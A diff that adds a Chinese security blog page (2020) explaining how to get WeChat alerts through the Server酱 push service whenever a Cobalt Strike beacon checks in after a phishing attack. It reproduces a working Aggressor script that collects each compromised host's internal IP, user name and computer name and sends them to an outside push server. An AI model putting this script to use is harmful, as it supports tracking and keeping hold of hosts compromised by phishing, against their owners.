@@ -1,0 +1,183 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>关于cobaltstrike微信上线通知的学习 | 藏青&#39;s BLOG</title>
+
+  
+  <meta name="author" content="藏青">
+  
+
+  
+  <meta name="description" content="知行合一">
+  
+
+  
+  <meta name="keywords" content="渗透 内网 代码审计">
+  
+
+  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+  <meta property="og:title" content="关于cobaltstrike微信上线通知的学习"/>
+
+  <meta property="og:site_name" content="藏青&#39;s BLOG"/>
+
+  
+  <meta property="og:image" content="/favicon.ico"/>
+  
+
+  <link href="/favicon.ico" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="藏青&#39;s BLOG" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+<div class="blog">
+  <div class="content">
+
+    <header>
+  <div class="site-branding">
+    <h1 class="site-title">
+      <a href="/">藏青&#39;s BLOG</a>
+    </h1>
+    <p class="site-description"></p>
+  </div>
+  <nav class="site-navigation">
+    <ul>
+      
+        <li><a href="/">Home</a></li>
+      
+        <li><a href="/archives">Archives</a></li>
+      
+        <li><a href="/categories">Categories</a></li>
+      
+        <li><a href="/links">Links</a></li>
+      
+    </ul>
+  </nav>
+</header>
+
+    <main class="site-main posts-loop">
+    <article>
+
+  
+    
+    <h3 class="article-title"><span>关于cobaltstrike微信上线通知的学习</span></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2020/09/01/关于CS上线微信通知的学习/" rel="bookmark">
+        <time class="entry-date published" datetime="2020-09-01T08:15:43.000Z">
+          2020-09-01
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>​    有时候渗透中我们可能需要对一些目标进行钓鱼，常用的就是使用邮件进行钓鱼，但是邮件钓鱼有一个问题，就是实时性不高，可能我们发了邮件，目标很久才会点，如果目标上线后我们没有及时进行利用或者权限维持，等我们再去看可能目标已经丢了，再想让目标点击上线已经不容易了，这就导致我们之前所做的事情功亏一篑，因此我们需要某种方法，让我们能随时知道目标是否上线，也不用一直盯着电脑。</p>
+<p>​    经过查找网上的资料，发现已经有人实现了通过server酱和CS扩展脚本来让目标上线后进行微信提醒的功能。</p>
+<span id="more"></span>
+
+<h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><h4 id="server酱申请"><a href="#server酱申请" class="headerlink" title="server酱申请"></a>server酱申请</h4><p><strong>什么是server酱？</strong></p>
+<p>​    简单来讲就是推送服务器警报到手机的工具。</p>
+<p><strong>怎么使用？</strong></p>
+<ol>
+<li>登入：用GitHub账号<a target="_blank" rel="noopener" href="http://sc.ftqq.com/?c=github&a=login">登入网站</a>，就能获得一个<a target="_blank" rel="noopener" href="http://sc.ftqq.com/?c=code">SCKEY</a>（在「<a target="_blank" rel="noopener" href="http://sc.ftqq.com/?c=code">发送消息</a>」页面）</li>
+<li>绑定：点击「<a target="_blank" rel="noopener" href="http://sc.ftqq.com/?c=wechat&a=bind">微信推送</a>」，扫码关注同时即可完成绑定</li>
+<li>发消息：往 <a target="_blank" rel="noopener" href="http://sc.ftqq.com/SCKEY.send">http://sc.ftqq.com/SCKEY.send</a> 发GET请求，就可以在微信里收到消息啦</li>
+</ol>
+<p><strong>绑定过程</strong></p>
+<p>​    首先我们访问<a target="_blank" rel="noopener" href="http://sc.ftqq.com/?c=github&a=login">地址</a>使用github进行授权登录，登录成功后访问<a target="_blank" rel="noopener" href="http://sc.ftqq.com/?c=code">地址</a>获取SCKEY，如下</p>
+<p><img src="/2020/09/01/%E5%85%B3%E4%BA%8ECS%E4%B8%8A%E7%BA%BF%E5%BE%AE%E4%BF%A1%E9%80%9A%E7%9F%A5%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200801094439398.png" alt="image-20200801094439398"></p>
+<p>​    然后访问<a target="_blank" rel="noopener" href="http://sc.ftqq.com/?c=wechat&a=bind">微信推送</a>扫码关注进行绑定,微信扫描后点击“检查结果并确认绑定”</p>
+<p><img src="/2020/09/01/%E5%85%B3%E4%BA%8ECS%E4%B8%8A%E7%BA%BF%E5%BE%AE%E4%BF%A1%E9%80%9A%E7%9F%A5%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200801094641509.png" alt="image-20200801094641509"></p>
+<p>​    绑定成功后界面如下：</p>
+<p><img src="/2020/09/01/%E5%85%B3%E4%BA%8ECS%E4%B8%8A%E7%BA%BF%E5%BE%AE%E4%BF%A1%E9%80%9A%E7%9F%A5%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200801094745848.png" alt="image-20200801094745848"></p>
+<p>​    绑定成功后可以访问<a target="_blank" rel="noopener" href="http://sc.ftqq.com/?c=code">地址</a>发送消息进行测试。</p>
+<p><img src="/2020/09/01/%E5%85%B3%E4%BA%8ECS%E4%B8%8A%E7%BA%BF%E5%BE%AE%E4%BF%A1%E9%80%9A%E7%9F%A5%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200801094922473.png" alt="image-20200801094922473"></p>
+<p>​    点击发送的同时，即可在微信上接收到结果。</p>
+<p><img src="/2020/09/01/%E5%85%B3%E4%BA%8ECS%E4%B8%8A%E7%BA%BF%E5%BE%AE%E4%BF%A1%E9%80%9A%E7%9F%A5%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200801095019358.png" alt="image-20200801095019358"></p>
+<p>​    当然我们也可以调用接口来发送消息，如果是发送一个get请求，访问如下链接即可发送,这里的SCKEY是我们申请到的SCKEY,实际使用的过程中需要将其替换。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://sc.ftqq.com/SCKEY.send?text=%E4%B8%BB%E4%BA%BA%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%88%E6%8C%82%E6%8E%89%E5%95%A6~</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/01/%E5%85%B3%E4%BA%8ECS%E4%B8%8A%E7%BA%BF%E5%BE%AE%E4%BF%A1%E9%80%9A%E7%9F%A5%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200801095324207.png" alt="image-20200801095324207"></p>
+<p><img src="/2020/09/01/%E5%85%B3%E4%BA%8ECS%E4%B8%8A%E7%BA%BF%E5%BE%AE%E4%BF%A1%E9%80%9A%E7%9F%A5%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200801095413716.png" alt="image-20200801095413716"></p>
+<p><strong>如何调用接口发送正文？</strong></p>
+<p>​    通过GET方式访问接口确实可以发送消息，不过使用GET发送的请求没有正文，或者说正文长度会受到长度限制，我们可以通过POST请求来进行发送，只需要添加一个desp参数即可。</p>
+<p><img src="/2020/09/01/%E5%85%B3%E4%BA%8ECS%E4%B8%8A%E7%BA%BF%E5%BE%AE%E4%BF%A1%E9%80%9A%E7%9F%A5%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200801100120759.png" alt="image-20200801100120759"></p>
+<p><img src="/2020/09/01/%E5%85%B3%E4%BA%8ECS%E4%B8%8A%E7%BA%BF%E5%BE%AE%E4%BF%A1%E9%80%9A%E7%9F%A5%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200801100656685.png" alt="image-20200801100656685"></p>
+<h4 id="结合CS完成上线提醒"><a href="#结合CS完成上线提醒" class="headerlink" title="结合CS完成上线提醒"></a>结合CS完成上线提醒</h4><p>​    当我们配置好server酱是不是觉得上线微信提醒非常简单呢，是的，接下来我们需要做的，就是写一个插件，当CS上线的时候，只需要提交一个POST请求，将上线的主机发送给我们就可以的，虽然说起来比较简单，但是像我这种菜水水是不会写CS插件的，幸好已经有大佬写好了插件了，代码如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"># 循环获取所有beacon</span><br><span class="line">on beacon_initial &#123;</span><br><span class="line"></span><br><span class="line">	sub http_get &#123;</span><br><span class="line">		local(&#x27;$output&#x27;);</span><br><span class="line">		$url = [new java.net.URL: $1];</span><br><span class="line">		$stream = [$url openStream];</span><br><span class="line">		$handle = [SleepUtils getIOHandle: $stream, $null];</span><br><span class="line"></span><br><span class="line">		@content = readAll($handle);</span><br><span class="line"></span><br><span class="line">		foreach $line (@content) &#123;</span><br><span class="line">			$output .= $line . &quot;\r\n&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		println($output);</span><br><span class="line">	&#125;</span><br><span class="line">	#获取ip、计算机名、登录账号</span><br><span class="line">	$internalIP = replace(beacon_info($1, &quot;internal&quot;), &quot; &quot;, &quot;_&quot;);</span><br><span class="line">	$userName = replace(beacon_info($1, &quot;user&quot;), &quot; &quot;, &quot;_&quot;);</span><br><span class="line">    $computerName = replace(beacon_info($1, &quot;computer&quot;), &quot; &quot;, &quot;_&quot;);</span><br><span class="line">	</span><br><span class="line">	#get一下Server酱的链接</span><br><span class="line">	$url = &#x27;https://sc.ftqq.com/此处填写你Server酱的SCKEY码.send?text=CobaltStrike%e4%b8%8a%e7%ba%bf%e6%8f%90%e9%86%92&amp;desp=%e4%bb%96%e6%9d%a5%e4%ba%86%e3%80%81%e4%bb%96%e6%9d%a5%e4%ba%86%ef%bc%8c%e4%bb%96%e8%84%9a%e8%b8%8f%e7%a5%a5%e4%ba%91%e8%b5%b0%e6%9d%a5%e4%ba%86%e3%80%82%0D%0A%0D%0Aip:&#x27;.$internalIP.&#x27;%0D%0A%0D%0A%e7%94%a8%e6%88%b7%e5%90%8d:&#x27;.$userName.&#x27;%0D%0A%0D%0A%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%90%8d:&#x27;.$computerName;</span><br><span class="line">	</span><br><span class="line">	http_get($url);</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​    我们看下代码，其实也确实非常简单，首先写了一个循环获取beacon的代码,beacon_initial方法可以理解为给新的Beacons会话添加一个自动运行的脚本，或者是让所有的新会话都运行一遍写好的脚本。当有新的会话加入就会自动加载。</p>
+<p>​    作者在beacon_initial自定义了发送get请求的函数，通过beacon_info获取一些基本的主机，最后调用接口进行发送。</p>
+<p>​    最后我们替换get请求位置的SCKEY为我们申请的key，使用CS加载插件进行测试，当设备上线的同时，我们也接收到了微信的通知。</p>
+<p><img src="/2020/09/01/%E5%85%B3%E4%BA%8ECS%E4%B8%8A%E7%BA%BF%E5%BE%AE%E4%BF%A1%E9%80%9A%E7%9F%A5%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200801103207065.png" alt="image-20200801103207065"></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​    之前我认为要实现微信上线自动提醒这种功能是非常难的，但是还是有人通过这种非常简单的方式实现了这个功能，所以还是多去尝试某些东西，即使可能会失败。</p>
+<p><strong>参考文章</strong></p>
+<p><a target="_blank" rel="noopener" href="http://www.nmd5.com/?p=567">Cobalt Strike 上线微信提醒</a></p>
+<p><a target="_blank" rel="noopener" href="http://sc.ftqq.com/3.version">server酱</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6188">CobaltStrike插件开发官方指南 Part3</a></p>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/categories/cobaltstrike/">cobaltstrike</a>
+    </span>
+    
+
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+  
+
+
+
+
+
+
+    </main>
+
+    <footer class="site-footer">
+  <p class="site-info">
+    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
+    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
+    </br>
+    
+    &copy; 2021 藏青
+    
+  </p>
+</footer>
+    
+    
+  </div>
+</div>
+</body>
+</html>
